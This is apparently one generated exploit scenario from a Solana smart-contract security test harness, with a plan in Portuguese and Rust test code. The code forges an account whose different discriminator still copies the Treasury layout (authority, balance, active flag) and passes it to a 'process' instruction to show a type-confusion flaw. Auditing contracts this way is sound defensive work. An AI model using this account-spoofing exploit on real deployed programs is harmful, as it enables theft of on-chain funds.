  "plan": "O cenário inicializa uma conta Treasury legítima via `initialize` (baseline) para provar que o programa aceita o layout correto. Em seguida, o ataque chama `process` passando uma conta de outro tipo (discriminador diferente) cujo layout nos offsets 8..40, 40..48 e 48 imita authority, balance e is_active=true, explorando a ausência de validação do discriminador. O efeito medido é que a instrução `process` retorna sucesso com uma conta cujo discriminador não é o de Treasury, demonstrando o COSPLAY.",
  "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();

// Baseline: inicializa uma Treasury legítima
let init_ix = env.anchor_ix(
    "initialize",
    &(100u64,),
    vec![
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);
let (system_program_id, system_program_account) = system_program_account();
let init_accounts = vec![
    (treasury_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    (system_program_id, system_program_account),
];
let baseline = env.baseline("initialize legitimo", &init_ix, &init_accounts);

// Ataque: conta de outro tipo (discriminador diferente) com layout que imita Treasury
let fake_disc = anchor_account_discriminator("FakeTreasury");
let mut fake_data = Vec::new();
fake_data.extend_from_slice(&fake_disc);
fake_data.extend_from_slice(authority.as_ref());
fake_data.extend_from_slice(&500u64.to_le_bytes());
fake_data.push(1u8); // is_active = true
let fake_account = account(&env.program_id, &fake_data, None);

let attack_ix = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(treasury_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let attack_accounts = vec![
    (treasury_key, fake_account),
    (authority, wallet(1_000_000_000)),
];
let r = env.attack("process com conta de outro tipo", &attack_ix, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &treasury_key).data();
    let disc = &data[0..8];
    env.effect(
        "process aceitou conta com discriminador diferente de Treasury",
        disc != anchor_account_discriminator("Treasury"),
    );
}"
